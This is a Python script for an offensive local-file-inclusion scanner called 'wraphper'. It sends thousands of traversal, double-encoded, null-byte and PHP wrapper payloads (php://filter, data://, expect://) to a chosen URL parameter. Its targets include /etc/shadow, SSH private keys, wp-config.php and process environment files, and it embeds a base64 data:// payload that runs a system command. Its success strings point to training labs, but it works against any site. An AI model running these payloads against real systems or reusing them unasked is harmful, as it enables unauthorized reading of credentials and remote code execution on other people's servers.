#!/usr/bin/env python3

import requests
import argparse
import urllib.parse
import base64
import itertools
import time
import signal
import threading
import itertools as it
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Generator, Optional, Dict, Tuple
from dataclasses import dataclass
import warnings
from urllib.parse import urlparse, parse_qs, urljoin
import re
import os
import json

class Banner:
    @staticmethod
    def show():
        print(
        """
\033[96m
                           _          _____      
 __      ___ __ __ _ _ __ | |__  _ __|___ / _ __ 
 \\ \\ /\\ / / '__/ _` | '_ \\| '_ \\| '_ \\ |_ \\| '__|
  \\ V  V /| | | (_| | |_) | | | | |_) |__) | |   
   \\_/\\_/ |_|  \\__,_| .__/|_| |_| .__/____/|_|   
                    |_|         |_|              
\033[0m
        \033[93mLFI Wrapper Scanner v2.0\033[0m
        \033[94mPHP Wrapper-based LFI Detection Tool\033[0m
        \033[95mAuthor: csshark\033[0m
        """
        )


class HTTPClient:
    def __init__(
        self,
        proxy: Optional[str] = None,
        follow_redirects: bool = False,
        verify_ssl: bool = True,
        cookies: Optional[Dict] = None,
        headers: Optional[Dict] = None,
        timeout: int = 10,
        user_agent: str = "wraphper/1.0"
    ):
        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.follow_redirects = follow_redirects
        self.timeout = timeout
        
        if proxy:
            self.session.proxies = {
                "http": proxy,
                "https": proxy
            }
        
        default_headers = {
            "User-Agent": user_agent
        }
        
        if headers:
            default_headers.update(headers)
            
        self.session.headers.update(default_headers)
        
        if cookies:
            self.session.cookies.update(cookies)
    
    def get(self, url: str, timeout: Optional[int] = None) -> Optional[requests.Response]:
        try:
            return self.session.get(
                url,
                timeout=timeout or self.timeout,
                allow_redirects=self.follow_redirects
            )
        except requests.RequestException:
            return None
    
    def post(self, url: str, data: Dict, timeout: Optional[int] = None) -> Optional[requests.Response]:
        try:
            return self.session.post(
                url,
                data=data,
                timeout=timeout or self.timeout,
                allow_redirects=self.follow_redirects
            )
        except requests.RequestException:
            return None


class PayloadGenerator:
    TRAVERSALS = [
        "../",
        "..\\",
        "..//",
        "....//",
        "....///",
        "..;/",
        "..%2f",
        "..%5c",
        "%2e%2e/",
        "%2e%2e%2f",
        "..%252f",
        "..%c0%af",
        "..%c1%9c",
        "%252e%252e%252f",
        "..%00/",
        "..\x00/",
        "....\\/",
        "..%5c..%5c",
    ]
    
    FILE_TARGETS = [
        "/etc/passwd",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/issue",
        "/etc/shadow",
        "/etc/group",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/status",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "/proc/version",
        "/proc/cpuinfo",
        "/proc/meminfo",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/error_log",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/auth.log",
        "/home/carlos/secret",
        "/home/carlos/.bash_history",
        "/home/carlos/.ssh/id_rsa",
        "/root/.ssh/id_rsa",
        "/var/www/html/index.php",
        "/var/www/index.php",
        "/var/www/html/wp-config.php",
        "C:/Windows/win.ini",
        "C:/Windows/system.ini",
        "C:/Windows/System32/drivers/etc/hosts",
        "C:/xampp/apache/logs/access.log",
        "C:/xampp/apache/logs/error.log",
        "C:/wamp/logs/access.log",
        "C:/wamp/logs/error.log",
        "C:/Program Files/Apache Group/Apache2/logs/access.log",
    ]
    
    FILTER_CHAINS = [
        "convert.base64-encode",
        "string.rot13",
        "string.toupper",
        "string.tolower",
        "string.strip_tags",
        "convert.iconv.utf-8.utf-16",
        "convert.iconv.utf-16.utf-8",
        "convert.quoted-printable-encode",
        "zlib.deflate",
        "zlib.inflate",
        "bzip2.compress",
        "bzip2.decompress",
    ]
    
    WRAPPER_PAYLOADS = [
        "php://filter/{FILTER}/resource={PATH}",
        "file://{PATH}",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
        "data://text/plain,<?php phpinfo();?>",
        "expect://id",
        "phar://{PATH}",
        "zip://{PATH}%23test",
        "compress.zlib://{PATH}",
        "compress.bzip2://{PATH}",
    ]
    
    NULL_BYTE_VARIANTS = ["%00", "\x00", ";", "?"]
    
    def __init__(self, custom_files: Optional[List[str]] = None, target_dir: Optional[str] = None, intensity: str = "normal"):
        self.custom_files = custom_files
        self.target_dir = target_dir
        self.intensity = intensity
    
    def generate_path_variants(self, file_path: str) -> List[str]:
        variants = set()
        
        variants.add(file_path)
        variants.add(file_path.lstrip('/'))
        
        for traversal in self.TRAVERSALS:
            variants.add(f"{traversal}{file_path}")
        
        for i in range(1, 10):
            padding = "../" * i
            variants.add(f"{padding}{file_path}")
            variants.add(f"{padding}{file_path.lstrip('/')}")
        
        variants.add(f"....//....//....//....//{file_path}")
        variants.add(f"....\\/....\\/....\\/....\\/{file_path}")
        
        variants.add(f"/var/www/images/../../../..{file_path}")
        variants.add(f"/var/www/html/../../../..{file_path}")
        
        return list(variants)
    
    def generate_double_encoding_variants(self, file_path: str) -> List[str]:
        variants = set()
        
        path = f"....//....//....//....//{file_path}"
        
        variants.add(urllib.parse.quote(urllib.parse.quote(path)))
        variants.add(path.replace("/", "%252f"))
        variants.add(path.replace(".", "%252e").replace("/", "%252f"))
        variants.add(f"..%252f..%252f..%252f..%252f{file_path}")
        variants.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{file_path}")
        
        encoded_path = urllib.parse.quote(file_path)
        for traversal in ["..%252f", "%252e%252e%252f", "..%252f..%252f..%252f"]:
            variants.add(f"{traversal}{encoded_path}")
            variants.add(f"{traversal}{file_path}")
        
        return list(variants)
    
    def generate_filter_chains(self) -> List[str]:
        chains = []
        for r in range(1, 3):
            for combo in itertools.permutations(self.FILTER_CHAINS, r):
                chains.append("|".join(combo))
        return chains
    
    def generate(self) -> Generator[str, None, None]:
        file_targets = self.custom_files if self.custom_files else self.FILE_TARGETS
        
        if self.target_dir:
            file_targets = [self.target_dir] + list(file_targets)
        
        filter_chains = self.generate_filter_chains()
        
        for file_target in file_targets:
            path_variants = self.generate_path_variants(file_target)
            double_encoded = self.generate_double_encoding_variants(file_target)
            
            all_paths = set(path_variants + double_encoded)
            
            for path in all_paths:
                yield path
                
                yield urllib.parse.quote(path)
                
                if self.intensity in ["aggressive", "normal"]:
                    yield urllib.parse.quote(urllib.parse.quote(path))
                
                for null in self.NULL_BYTE_VARIANTS:
                    yield f"{path}{null}"
                    if self.intensity == "aggressive":
                        yield f"{path}{null}.php"
                        yield f"{path}{null}.html"
                        yield f"{path}{null}.jpg"
                
                if self.intensity == "aggressive":
                    yield f"{path}."
                    yield f"{path}./"
                    yield f"{path}%2500"
                
                for wrapper in self.WRAPPER_PAYLOADS:
                    if "{PATH}" in wrapper and "{FILTER}" in wrapper:
                        for chain in filter_chains[:3]:
                            yield wrapper.replace("{FILTER}", chain).replace("{PATH}", path)
                    elif "{PATH}" in wrapper:
                        yield wrapper.replace("{PATH}", path)
                    else:
                        yield wrapper
        
        yield "/etc/passwd"
        yield "....//....//....//....//etc/passwd"
        yield "..%252f..%252f..%252f..%252fetc/passwd"
        yield "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"
        yield urllib.parse.quote("....//....//....//....//etc/passwd")
        yield urllib.parse.quote(urllib.parse.quote("....//....//....//....//etc/passwd"))


class ResponseAnalyzer:
    INDICATORS = {
        "root:x:0:0": {"type": "LFI", "confidence": 0.95},
        "root:*:0:0": {"type": "LFI", "confidence": 0.95},
        "daemon:x:1:1": {"type": "LFI", "confidence": 0.9},
        "bin:x:2:2": {"type": "LFI", "confidence": 0.9},
        "nobody:x:65534": {"type": "LFI", "confidence": 0.85},
        "carlos:x:": {"type": "LFI", "confidence": 0.95},
        "[fonts]": {"type": "LFI", "confidence": 0.9},
        "[extensions]": {"type": "LFI", "confidence": 0.9},
        "[mci extensions]": {"type": "LFI", "confidence": 0.9},
        "[files]": {"type": "LFI", "confidence": 0.85},
        "127.0.0.1": {"type": "LFI", "confidence": 0.7},
        "localhost": {"type": "LFI", "confidence": 0.7},
        "uid=": {"type": "RCE", "confidence": 0.95},
        "gid=": {"type": "RCE", "confidence": 0.95},
        "VULN": {"type": "RCE", "confidence": 0.8},
        "phpinfo()": {"type": "RCE", "confidence": 0.9},
        "PHP Version": {"type": "RCE", "confidence": 0.9},
        "Congratulations": {"type": "SUCCESS", "confidence": 1.0},
        "solved": {"type": "SUCCESS", "confidence": 1.0},
    }
    
    ERROR_PATTERNS = [
        r"Warning:\s+include\(([^)]+)\)",
        r"Warning:\s+require\(([^)]+)\)",
        r"Warning:\s+include_once\(([^)]+)\)",
        r"Warning:\s+require_once\(([^)]+)\)",
        r"failed to open stream:\s+(.+?)\s+in",
        r"No such file or directory in (.+?) on line",
        r"open_basedir restriction in effect",
    ]
    
    @staticmethod
    def extract_path_from_error(content: str) -> Optional[str]:
        for pattern in ResponseAnalyzer.ERROR_PATTERNS:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                return match.group(1)
        return None
    
    @staticmethod
    def analyze_base64_content(content: str) -> Tuple[Optional[str], Optional[str]]:
        try:
            cleaned = ''.join(content.split())
            if len(cleaned) % 4 == 0 and len(cleaned) > 20:
                try:
                    decoded = base64.b64decode(cleaned).decode('utf-8', errors='ignore')
                    for pattern, info in ResponseAnalyzer.INDICATORS.items():
                        if pattern in decoded:
                            return f"{info['type']}(base64)", decoded
                except:
                    pass
            
            b64_pattern = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', content)
            for match in b64_pattern:
                try:
                    decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                    for pattern, info in ResponseAnalyzer.INDICATORS.items():
                        if pattern in decoded:
                            return f"{info['type']}(base64)", decoded
                except:
                    continue
        except:
            pass
        return None, None
    
    @staticmethod
    def analyze_php_errors(content: str) -> Dict:
        errors = {}
        
        path = ResponseAnalyzer.extract_path_from_error(content)
        if path:
            errors['exposed_path'] = path
            errors['error_type'] = 'path_disclosure'
        
        abs_paths = re.findall(r'/(?:[a-zA-Z0-9._-]+/)*[a-zA-Z0-9._-]+\.php', content)
        if abs_paths:
            errors['absolute_paths'] = abs_paths
        
        return errors
    
    @staticmethod
    def analyze(content: str, response_headers: Dict = None) -> Dict:
        result = {
            'vulnerability_type': None,
            'confidence': 0.0,
            'details': {},
            'indicators_found': []
        }
        
        if not content:
            return result
        
        for pattern, info in ResponseAnalyzer.INDICATORS.items():
            if pattern in content:
                result['indicators_found'].append({
                    'pattern': pattern,
                    'type': info['type'],
                    'confidence': info['confidence']
                })
                
                if info['confidence'] > result['confidence']:
                    result['vulnerability_type'] = info['type']
                    result['confidence'] = info['confidence']
        
        vuln_type, decoded = ResponseAnalyzer.analyze_base64_content(content)
        if vuln_type:
            result['vulnerability_type'] = vuln_type
            result['confidence'] = max(result['confidence'], 0.8)
            result['details']['base64_decoded'] = decoded[:500]
        
        php_errors = ResponseAnalyzer.analyze_php_errors(content)
        if php_errors:
            result['details']['php_errors'] = php_errors
            
            if 'exposed_path' in php_errors:
                result['confidence'] = max(result['confidence'], 0.85)
                if not result['vulnerability_type']:
                    result['vulnerability_type'] = 'PATH_DISCLOSURE'
        
        if response_headers:
            result['details']['interesting_headers'] = {}
            for header in ['Server', 'X-Powered-By', 'Set-Cookie']:
                if header in response_headers:
                    result['details']['interesting_headers'][header] = response_headers[header]
        
        return result


@dataclass
class Finding:
    payload: str
    vuln_type: str
    confidence: float
    details: Dict = None
    url: str = ""
    
    def __post_init__(self):
        if self.details is None:
            self.details = {}


class ProgressAnimator(threading.Thread):
    def __init__(self, scanner):
        super().__init__(daemon=True)
        self.scanner = scanner
        self.running = True
    
    def run(self):
        spinner = it.cycle(["|", "/", "-", "\\"])
        
        while self.running:
            with self.scanner.lock:
                print(
                    f"\r[{next(spinner)}] "
                    f"Tested: {self.scanner.tested} | "
                    f"Findings: {len(self.scanner.findings)} | "
                    f"Active Threads: {threading.active_count()-2}",
                    end="",
                    flush=True
                )
            time.sleep(0.1)


class LFIScanner:
    def __init__(
        self,
        client: HTTPClient,
        delay: float = 0.1,
        threads: int = 10,
        method: str = "GET",
        post_data: Dict = None,
        target_files: Optional[List[str]] = None,
        target_dir: Optional[str] = None,
        intensity: str = "normal",
        output_file: Optional[str] = None,
        verbose: bool = False
    ):
        self.client = client
        self.delay = delay
        self.threads = threads
        self.method = method.upper()
        self.post_data = post_data or {}
        self.stop = False
        self.findings: List[Finding] = []
        self.tested = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.target_files = target_files
        self.target_dir = target_dir
        self.intensity = intensity
        self.output_file = output_file
        self.verbose = verbose
        
        signal.signal(signal.SIGINT, self._handle_stop)
    
    def _handle_stop(self, *_):
        print("\n\033[93m[!] Stopping scan...\033[0m")
        self.stop = True
    
    def get_speed(self) -> float:
        elapsed = time.time() - self.start_time
        return self.tested / elapsed if elapsed > 0 else 0
    
    def save_results(self):
        if not self.output_file:
            return
        
        try:
            results = {
                'scan_info': {
                    'total_tested': self.tested,
                    'duration': time.time() - self.start_time,
                    'findings_count': len(self.findings)
                },
                'findings': []
            }
            
            for finding in self.findings:
                results['findings'].append({
                    'type': finding.vuln_type,
                    'confidence': finding.confidence,
                    'payload': finding.payload,
                    'url': finding.url,
                    'details': finding.details
                })
            
            with open(self.output_file, 'w') as f:
                json.dump(results, f, indent=2)
            
            print(f"\n\033[96m[*] Results saved to: {self.output_file}\033[0m")
        except Exception as e:
            print(f"\n\033[91m[!] Failed to save results: {str(e)}\033[0m")
    
    def scan_payload(self, url: str, param: str, payload: str):
        if self.stop:
            return
        
        try:
            if self.method == "GET":
                parsed = urlparse(url)
                query_params = parse_qs(parsed.query)
                query_params[param] = [payload]
                
                new_query = "&".join([f"{k}={urllib.parse.quote(v[0], safe='')}" for k, v in query_params.items()])
                full_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                
                response = self.client.get(full_url)
            else:
                post_data = self.post_data.copy()
                post_data[param] = payload
                full_url = url
                response = self.client.post(url, post_data)
            
            with self.lock:
                self.tested += 1
            
            if not response:
                return
            
            analysis = ResponseAnalyzer.analyze(
                response.text,
                dict(response.headers)
            )
            
            if self.verbose:
                if analysis['confidence'] > 0.3:
                    print(f"\n\033[90m[*] {payload[:60]} | {response.status_code} | "
                          f"{analysis['vulnerability_type']} | {analysis['confidence']:.2f}\033[0m")
            
            if analysis['vulnerability_type'] and analysis['confidence'] > 0.6:
                with self.lock:
                    finding = Finding(
                        payload=payload,
                        vuln_type=analysis['vulnerability_type'],
                        confidence=analysis['confidence'],
                        details=analysis['details'],
                        url=full_url
                    )
                    self.findings.append(finding)
                    
                    color = "\033[92m" if analysis['confidence'] > 0.8 else "\033[93m"
                    print(f"\n{color}[+] {finding.vuln_type} -> {payload}\033[0m")
        
        except Exception as e:
            if self.verbose:
                print(f"\n\033[91m[!] Error: {str(e)[:50]}\033[0m")
        
        time.sleep(self.delay)
    
    def scan(self, url: str, param: str):
        print(f"\033[96m[*] Target: {url}\033[0m")
        print(f"\033[96m[*] Parameter: {param}\033[0m")
        print(f"\033[96m[*] Threads: {self.threads}\033[0m")
        print(f"\033[96m[*] Intensity: {self.intensity}\033[0m")
        
        if self.target_dir:
            print(f"\033[96m[*] Target directory: {self.target_dir}\033[0m")
        
        if self.target_files:
            print(f"\033[96m[*] Custom files: {len(self.target_files)}\033[0m")
        
        print()
        
        payload_generator = PayloadGenerator(
            custom_files=self.target_files,
            target_dir=self.target_dir,
            intensity=self.intensity
        )
        
        payloads = list(dict.fromkeys(payload_generator.generate()))
        print(f"\033[96m[*] Generated {len(payloads)} unique payloads\033[0m\n")
        
        animator = ProgressAnimator(self)
        animator.start()
        
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                
                for payload in payloads:
                    if self.stop:
                        break
                    
                    futures.append(
                        executor.submit(
                            self.scan_payload,
                            url,
                            param,
                            payload
                        )
                    )
                
                for future in as_completed(futures):
                    if self.stop:
                        break
        finally:
            animator.running = False
            print()
            self.summary()
            
            if self.output_file:
                self.save_results()
    
    def summary(self):
        print("\n\033[95m=== SUMMARY ===\033[0m")
        print(f"Total tested: {self.tested}")
        print(f"Findings: {len(self.findings)}")
        
        if self.findings:
            for f in self.findings:
                print(f"{f.vuln_type}: {f.payload}")
        else:
            print("\n\033[91m[-] No vulnerabilities found\033[0m")


def main():
    warnings.filterwarnings("ignore")
    parser = argparse.ArgumentParser()
    
    parser.add_argument("url")
    parser.add_argument("param")
    parser.add_argument("--proxy")
    parser.add_argument("--delay", type=float, default=0.0)
    parser.add_argument("--threads", type=int, default=20)
    parser.add_argument("--follow-redirects", action="store_true")
    parser.add_argument("--insecure", action="store_true", help="Disable SSL verification")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--method", choices=["GET", "POST"], default="GET")
    parser.add_argument("--data", help="POST data")
    parser.add_argument("--cookie", help="Session cookies")
    parser.add_argument("--header", action="append", help="Custom headers")
    parser.add_argument("--user-agent", default="wraphper/1.0", help="Custom User-Agent")
    parser.add_argument("--target-file", action="append", help="Target specific file")
    parser.add_argument("--target-dir", help="Target specific directory")
    parser.add_argument("--target-list", help="File with list of targets")
    parser.add_argument("--intensity", choices=["light", "normal", "aggressive"], default="normal")
    parser.add_argument("--output", help="Save results to JSON file")
    parser.add_argument("--verbose", "-v", action="store_true")
    
    args = parser.parse_args()
    
    Banner.show()
    
    target_files = []
    if args.target_file:
        target_files.extend(args.target_file)
    
    if args.target_list:
        try:
            with open(args.target_list, 'r') as f:
                target_files.extend([line.strip() for line in f if line.strip()])
        except FileNotFoundError:
            print(f"\033[91m[!] File not found: {args.target_list}\033[0m")
            return
    
    if args.target_dir:
        target_files.append(args.target_dir)
    
    cookies = {}
    if args.cookie:
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                key, value = cookie.strip().split('=', 1)
                cookies[key] = value
    
    headers = {}
    if args.header:
        for header in args.header:
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
    
    post_data = {}
    if args.data:
        for pair in args.data.split('&'):
            if '=' in pair:
                key, value = pair.split('=', 1)
                post_data[key] = value
    
    client = HTTPClient(
        proxy=args.proxy,
        follow_redirects=args.follow_redirects,
        verify_ssl=not args.insecure,
        cookies=cookies,
        headers=headers,
        timeout=args.timeout,
        user_agent=args.user_agent
    )
    
    scanner = LFIScanner(
        client,
        delay=args.delay,
        threads=args.threads,
        method=args.method,
        post_data=post_data,
        target_files=target_files if target_files else None,
        target_dir=args.target_dir,
        intensity=args.intensity,
        output_file=args.output,
        verbose=args.verbose
    )
    
    scanner.scan(args.url, args.param)


if __name__ == "__main__":
    main()
